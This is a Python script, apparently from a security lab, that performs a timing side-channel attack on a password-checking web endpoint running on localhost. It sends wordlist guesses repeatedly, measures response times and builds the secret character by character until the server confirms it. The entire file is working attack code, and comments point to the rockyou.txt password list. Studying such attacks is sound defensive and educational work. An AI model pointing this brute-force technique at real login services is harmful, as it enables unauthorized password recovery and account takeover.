import requests
import time
from time import strftime

timingattack_url = "http://127.0.0.1:5000/timingAttack"
curr_time = strftime("%Y-%m-%d_%H-%M-%S")
# Normally, this is from a proper wordlist. But for simulation, it's one custom made- contains entire upper lowcase alphabet and all nums and special chars
## If you didn't fiddle with your kali for pentesting, check out rockyou.txt at only if you have tar it first!
### cat /etc/usr/share/wordlists/rockyou.txt


def post_c4(guess):
    start = time.perf_counter()
    response = requests.post(url=timingattack_url, headers={"Content-Type": "application/json"}, json={"password":guess})
    end = time.perf_counter()

    time_taken = end-start
    response_arr = [time_taken,response]

    return response_arr


timing_dict = {}
guessing = True
prefix = ""
attempts = 8                                    # powers of 2 increments

while guessing:
    with open("./wordlist.txt",mode='r') as wordlist:   # Read only

        for guess in wordlist:
            guess = prefix + guess.strip() 
            print("Current Guess: ", guess)
            timings = []                            # Even though the previous guess is cached, all guesses are cached so it should even out

            for _ in range(attempts):
        
                timetaken,result = post_c4(guess)
                timings.append(timetaken)

                if "Correct" in result.json()['Message']:
                    guessing = False
                    prefix = guess
                    break

            if guessing == False:
                break                               # Need to exit all the loops- too lazy to refactor for something clever

            timings.sort()
            filtered = timings[1:-1]                # Maybe remove min and max to remove outliers to increase accuracy??
            avg_time = sum(filtered)/len(filtered)
            timing_dict[avg_time] = guess
            
        if guessing == False:
            break                               # Need to exit all the loops- too lazy to refactor for something clever

        lowest_time = min(timing_dict.keys())
        guess_with_lowest_time = timing_dict.get(lowest_time)
        print("Guess With Lowest Time: ", guess_with_lowest_time)
        prefix = guess_with_lowest_time
        timing_dict = {}


print("C4 Exploded!\n")
print("Final Guess: ", prefix)
    